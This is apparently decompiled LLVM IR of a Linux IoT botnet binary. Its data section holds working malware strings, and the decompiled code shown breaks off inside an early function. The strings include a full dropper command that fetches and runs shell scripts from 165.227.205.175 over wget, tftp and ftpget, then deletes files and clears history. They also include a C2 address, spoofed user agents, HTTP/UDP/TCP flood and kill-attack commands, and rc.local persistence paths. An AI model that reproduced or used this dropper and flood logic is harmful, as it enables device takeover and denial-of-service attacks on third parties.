source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@cf = internal unnamed_addr global i1 false
@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805800c.2 = global i32 0
@global_var_8058024.3 = local_unnamed_addr global i32* @global_var_805800c.2
@global_var_8057504.4 = constant i32 0
@global_var_8058010.6 = local_unnamed_addr global i32 0
@global_var_80584e0.7 = global i32 0
@global_var_80584e4.8 = local_unnamed_addr global i32 0
@global_var_80584e8.9 = local_unnamed_addr global i32 0
@global_var_8058210.10 = local_unnamed_addr global i32 4095
@global_var_805820c.11 = local_unnamed_addr global i32 362436
@global_var_805532d.12 = constant [7 x i8] c"(null)\00"
@global_var_8055334.14 = constant [3 x i8] c"-c\00"
@global_var_8055337.15 = constant [3 x i8] c"sh\00"
@global_var_805533a.16 = constant [8 x i8] c"/bin/sh\00"
@global_var_8055360.17 = constant i32 -1
@global_var_80584c0.18 = local_unnamed_addr global i32 0
@global_var_8055321.19 = constant [8 x i8] c"busybox\00"
@global_var_8055329.20 = constant i32 2293796
@global_var_805532b.21 = constant i32 1848115235
@global_var_80581c0.22 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8055321.19, i32 0, i32 0), i8* bitcast (i32* @global_var_8055329.20 to i8*), i8* bitcast (i32* @global_var_805532b.21 to i8*)]
@global_var_80552f5.23 = constant [7 x i8] c"nvalid\00"
@global_var_80552fc.24 = constant [6 x i8] c"ailed\00"
@global_var_8055302.25 = constant [9 x i8] c"ncorrect\00"
@global_var_805530b.26 = constant [6 x i8] c"enied\00"
@global_var_8055311.27 = constant [5 x i8] c"rror\00"
@global_var_8055316.28 = constant [7 x i8] c"oodbye\00"
@global_var_805531d.29 = constant [4 x i8] c"bad\00"
@global_var_80581a0.30 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80552f5.23, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80552fc.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8055302.25, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805530b.26, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8055311.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8055316.28, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805531d.29, i32 0, i32 0)]
@global_var_80584c8.31 = local_unnamed_addr global i32 0
@global_var_80584cc.32 = local_unnamed_addr global i32 0
@global_var_805e754.33 = local_unnamed_addr global i32 0
@global_var_8055760.34 = constant [6 x i8] c":>%$#\00"
@global_var_8055767.39 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_805e748.40 = local_unnamed_addr global i32 0
@global_var_8055290.41 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_805529f.42 = constant [6 x i8] c"/tmp/\00"
@global_var_80552a5.43 = constant [6 x i8] c"/var/\00"
@global_var_80552ab.44 = constant [6 x i8] c"/dev/\00"
@global_var_80552b1.45 = constant [10 x i8] c"/var/run/\00"
@global_var_80552bb.46 = constant [10 x i8] c"/dev/shm/\00"
@global_var_80552c5.47 = constant [6 x i8] c"/mnt/\00"
@global_var_80552cb.48 = constant [7 x i8] c"/boot/\00"
@global_var_80552d2.49 = constant [6 x i8] c"/usr/\00"
@global_var_80552d8.50 = constant [6 x i8] c"/opt/\00"
@global_var_8058160.51 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8055290.41, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805529f.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80552a5.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80552ab.44, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80552b1.45, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80552bb.46, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80552c5.47, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80552cb.48, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80552d2.49, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80552d8.50, i32 0, i32 0)]
@global_var_805818c = external global i32
@global_var_8055773.56 = constant [3 x i8] c"\0D\0A\00"
@global_var_80581e0.57 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80552f5.23, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80552fc.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8055302.25, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805530b.26, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8055311.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8055316.28, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805531d.29, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8055321.19, i32 0, i32 0), i8* bitcast (i32* @global_var_8055329.20 to i8*), i8* bitcast (i32* @global_var_805532b.21 to i8*)]
@global_var_8055778.58 = constant i32 993090331
@global_var_80557d5.59 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_80557da.60 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_80550b0.61 = constant [415 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.205.175/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 165.227.205.175 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 165.227.205.175; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 165.227.205.175 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *;history -c\0D\0A\00"
@global_var_80580d4.62 = local_unnamed_addr global [415 x i8]* @global_var_80550b0.61
@global_var_8055804.63 = constant [6 x i8] c"arfgG\00"
@global_var_805580a.64 = constant [9 x i8] c"HBiug655\00"
@global_var_8055813.65 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_8055820.66 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_8055834.67 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_8055845.68 = constant [12 x i8] c"GJjyur67458\00"
@global_var_8055851.69 = constant [12 x i8] c"RYSDk747586\00"
@global_var_805585d.70 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_8055869.71 = constant [10 x i8] c"KHGK7985i\00"
@global_var_8055873.72 = constant [11 x i8] c"yuituiILYF\00"
@global_var_805587e.73 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_805588c.74 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_8055898.75 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_80558a5.76 = constant [9 x i8] c"ewqdcftr\00"
@global_var_80558ae.77 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_80558be.78 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_80558c9.79 = constant [12 x i8] c"twehgbferhb\00"
@global_var_80558d5.80 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_80558e1.81 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_80558ef.82 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_80558fd.83 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_805590b.84 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_8055915.85 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_8055923.86 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_8055931.87 = constant [12 x i8] c"yteytietyue\00"
@global_var_805593d.88 = constant [9 x i8] c"qsortEQS\00"
@global_var_8055946.89 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_8055956.90 = constant [4 x i8] c"std\00"
@global_var_805595a.91 = constant [4 x i8] c"dts\00"
@global_var_805595e.92 = constant [4 x i8] c"lsk\00"
@global_var_8055962.93 = constant [4 x i8] c"kek\00"
@global_var_8055966.94 = constant [6 x i8] c"smack\00"
@global_var_805596c.95 = constant [4 x i8] c"ily\00"
@global_var_8055970.96 = constant [4 x i8] c"tyf\00"
@global_var_8055974.97 = constant [4 x i8] c"pos\00"
@global_var_8055978.98 = constant [6 x i8] c"cunts\00"
@global_var_8055980.99 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055804.63, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805580a.64, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8055813.65, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_8055820.66, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8055834.67, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8055845.68, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8055851.69, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805585d.70, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8055869.71, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8055873.72, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805587e.73, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805588c.74, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8055898.75, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80558a5.76, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_80558ae.77, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80558be.78, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80558c9.79, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80558d5.80, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80558e1.81, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80558ef.82, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80558fd.83, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805590b.84, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8055915.85, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8055923.86, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8055931.87, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805593d.88, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8055946.89, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055956.90, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805595a.91, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805595e.92, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055962.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055966.94, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805596c.95, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055970.96, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055974.97, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055978.98, i32 0, i32 0)]
@global_var_80543c0.100 = constant [64 x i8] c"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_8054400.101 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_8054444.102 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_8054488.103 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_80544cc.104 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_8054510.105 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_8054554.106 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_8054598.107 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_8054608.108 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_805467c.109 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_80546c8.110 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_8054750.111 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_805479c.112 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_805480c.113 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_805487c.114 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_80548f0.115 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_8054968.116 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_80549b0.117 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_80549e0.118 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_8054a20.119 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_8054a6c.120 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_8054ae4.121 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_8054b54.122 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_8054bc4.123 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_8054c38.124 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_8054ccc.125 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_8054d14.126 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_8054d5c.127 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_8054d9c.128 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_8054e18.129 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_8054e80.130 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_8054efc.131 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_8054f4c.132 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_8054fa0.133 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_8054ff4.134 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_8055048.135 = constant [83 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0\00"
@global_var_805509b.136 = constant [21 x i8] c"165.227.205.175:6767\00"
@global_var_8055a10.138 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_8055a50.139 = constant [4 x i8] c"all\00"
@global_var_8055a54.140 = constant i32 2037579820
@global_var_8055a56.141 = constant [4 x i8] c"syn\00"
@global_var_8055a5a.142 = constant [4 x i8] c"rst\00"
@global_var_8055a5e.143 = constant [4 x i8] c"fin\00"
@global_var_8055a62.144 = constant [4 x i8] c"ack\00"
@global_var_8055a66.145 = constant [4 x i8] c"psh\00"
@global_var_8055a6a.146 = constant [5 x i8] c"PING\00"
@global_var_8055a6f.147 = constant [6 x i8] c"PUSSY\00"
@global_var_8055a75.148 = constant [4 x i8] c"OFF\00"
@global_var_805e750.149 = local_unnamed_addr global i32 0
@global_var_8055a79.150 = constant [3 x i8] c"ON\00"
@global_var_8055a7c.151 = constant [5 x i8] c"HTTP\00"
@global_var_8055a84.152 = constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00"
@global_var_8055aaa.153 = constant [4 x i8] c"UDP\00"
@global_var_8055aae.154 = constant [4 x i8] c"TCP\00"
@global_var_8055ab2.155 = constant [4 x i8] c"STD\00"
@global_var_8055ab6.156 = constant [9 x i8] c"KILLATTK\00"
@global_var_8058144.157 = local_unnamed_addr global i32 -1
@global_var_80580d0.158 = global [21 x i8]* @global_var_805509b.136
@global_var_8055abf.159 = constant [8 x i8] c"8.8.8.8\00"
@global_var_8055ac7.160 = constant [16 x i8] c"/proc/net/route\00"
@global_var_8055ad7.161 = constant [11 x i8] c"\0900000000\09\00"
@global_var_8055ae2.163 = constant [7 x i8] c"x86_32\00"
@global_var_8055ae9.164 = constant i32 1952788224
@global_var_8055aea.165 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_8055afd.166 = constant i32 1697579122
@global_var_8055aff.167 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_8055b0e.169 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_8055b16.170 = constant i32 1868955745
@global_var_8055b18.171 = constant [13 x i8] c"fork failed\0A\00"
@global_var_8055b28.172 = constant i32 993090331
@global_var_8055b8a.173 = constant [9 x i8] c"LELIMDUP\00"
@global_var_8055b93.174 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_8055ba7.175 = constant [11 x i8] c"STOLENBOTS\00"
@global_var_8055bb2.176 = constant [8 x i8] c"%s 2>&1\00"
@global_var_8055bba.177 = constant i32 32
@global_var_805e710.178 = local_unnamed_addr global i32 0
@global_var_8058218 = external local_unnamed_addr global i32
@global_var_8058280.181 = global i32 288
@global_var_80582d0.182 = local_unnamed_addr global i32 272
@global_var_805e720.184 = global i32 0
@global_var_8058254.185 = global i32 0
@global_var_805c4e4.186 = local_unnamed_addr global i32 0
@global_var_805c4e8.187 = local_unnamed_addr global i32 0
@global_var_805826c.188 = local_unnamed_addr global i32 2
@global_var_805823c.189 = global i32 0
@global_var_8058238.190 = global i32* @global_var_8058280.181
@global_var_80561c0.191 = constant i32 0
@global_var_80561d8.192 = constant [6 x i8] c"(nil)\00"
@global_var_80561de.193 = constant [7 x i8] c"(null)\00"
@global_var_80561e5.194 = constant i32 2949163
@global_var_8056252.196 = constant i32 327688
@global_var_805624a.197 = constant [8 x i8] c" +0-#'I\00"
@global_var_80561f8.198 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_8056235.199 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_805622b.200 = constant i32 117506048
@global_var_805621c.201 = constant i32 331776
@global_var_80562a0.202 = constant [8 x i8] c"Success\00"
@global_var_8056276.203 = constant [15 x i8] c"Unknown error \00"
@global_var_80571a0.204 = constant i32 65536
@global_var_8058480.205 = local_unnamed_addr global i32* @global_var_80571a0.204
@global_var_805e500.206 = global i32 0
@global_var_805e504.207 = global i32 0
@global_var_805e520.208 = global i32 0
@global_var_805e6ec.209 = global i32 0
@global_var_8058488.210 = global i32 0
@global_var_805eb74.211 = local_unnamed_addr global i32 0
@global_var_805eb68.212 = global i32 0
@global_var_805e760.213 = global i32 0
@global_var_8058370.214 = global i32 0
@global_var_805e80c.216 = global i32 0
@global_var_805e810.217 = local_unnamed_addr global i32 0
@global_var_805e814.218 = global i32 0
@global_var_805e820.219 = local_unnamed_addr global i32 0
@global_var_805eb14.220 = global i32 0
@global_var_805eb3c.221 = local_unnamed_addr global i32 0
@global_var_805eb2c.222 = local_unnamed_addr global i32 0
@global_var_805eb30.223 = local_unnamed_addr global i32 0
@global_var_805eb34.224 = local_unnamed_addr global i32 0
@global_var_805eb38.225 = local_unnamed_addr global i32 0
@global_var_805eb44.226 = local_unnamed_addr global i32 0
@global_var_805eb50.227 = local_unnamed_addr global i32 0
@global_var_805eb48.228 = local_unnamed_addr global i32 0
@global_var_805eb54.229 = local_unnamed_addr global i32 0
@global_var_805eb28.230 = local_unnamed_addr global i32 0
@global_var_805eb24.232 = local_unnamed_addr global i32 0
@global_var_805eb4c.233 = local_unnamed_addr global i32 0
@global_var_805e81c.234 = local_unnamed_addr global i32 0
@global_var_8058388.235 = global i32 0
@global_var_80583a0.237 = global i32 0
@global_var_80583b8 = external global i32
@global_var_80583e4.239 = global i32 -1726662223
@global_var_80583c0.240 = local_unnamed_addr global i32* @global_var_80583e4.239
@global_var_80583bc.241 = global i32* @global_var_80583e4.239
@global_var_8056e14.242 = constant i32 0
@global_var_8056e00.243 = constant i32 0
@global_var_8058460.244 = global i32 0
@global_var_805e704.245 = local_unnamed_addr global i32 0
@global_var_805e70c.246 = local_unnamed_addr global i32 0
@global_var_8058000.248 = global i32 -1
@global_var_80514b3.249 = constant i32 -294069
@global_var_805e714.250 = local_unnamed_addr global i32 0
@global_var_805e718.251 = local_unnamed_addr global i32 0
@global_var_8057080.252 = constant [10 x i8] c"/dev/null\00"
@global_var_805e708.254 = local_unnamed_addr global i32 0
@global_var_8051699.256 = constant i32 1928542531
@global_var_80516bd.257 = constant i32 1928542531
@global_var_805e744.258 = local_unnamed_addr global i32 0
@global_var_805e724.259 = global i32 0
@global_var_80573b0.261 = constant [4 x i8] c"inf\00"
@global_var_80573b3.266 = constant i32 1179535616
@global_var_80573c0.267 = constant i32 2883630
@global_var_805eb78.271 = local_unnamed_addr global i32 0
@global_var_805747c.272 = constant i32 1697579054
@global_var_80574b0.273 = constant i32 1868824690
@global_var_805747e.274 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805748f.275 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_80574a7.276 = constant [11 x i8] c"nameserver\00"
@global_var_80574b2.277 = constant [7 x i8] c"domain\00"
@global_var_80574b9.278 = constant [7 x i8] c"search\00"
@global_var_805eb58.279 = global i32 0
@global_var_805eb7c.280 = local_unnamed_addr global i32 0
@global_var_805eb80.281 = local_unnamed_addr global i32 0
@global_var_80574d4.282 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_80574d1.284 = constant [3 x i8] c"%x\00"
@global_var_80574e5.285 = constant [11 x i8] c"/etc/hosts\00"
@global_var_80574f0.286 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_80584a0.1 = local_unnamed_addr global i8 0
@global_var_805c4e0.13 = external local_unnamed_addr global i8*
@global_var_80584db.35 = local_unnamed_addr global i8 0
@global_var_80584dc.36 = local_unnamed_addr global i8 0
@global_var_80584dd.37 = local_unnamed_addr global i8 0
@global_var_80584de.38 = local_unnamed_addr global i8 0
@global_var_80584d0.162 = external global i8*
@1 = internal constant [2 x i8] c"/\00"
@global_var_8055b0c.168 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_805626a.195 = external constant i8*
@global_var_805e7e0.215 = global i8 0
@global_var_805eb40.231 = local_unnamed_addr global i8 0
@global_var_805e700.236 = local_unnamed_addr global i8 0
@global_var_805e71c.253 = local_unnamed_addr global i8 0
@global_var_805e728.268 = external global i8*
@global_var_805e740.269 = local_unnamed_addr global i64 0
@global_var_8058484.270 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 65399
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_80584a0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048106_crit_edge

entry.dec_label_pc_8048106_crit_edge:             ; preds = %entry
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8058024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8058024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8058024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
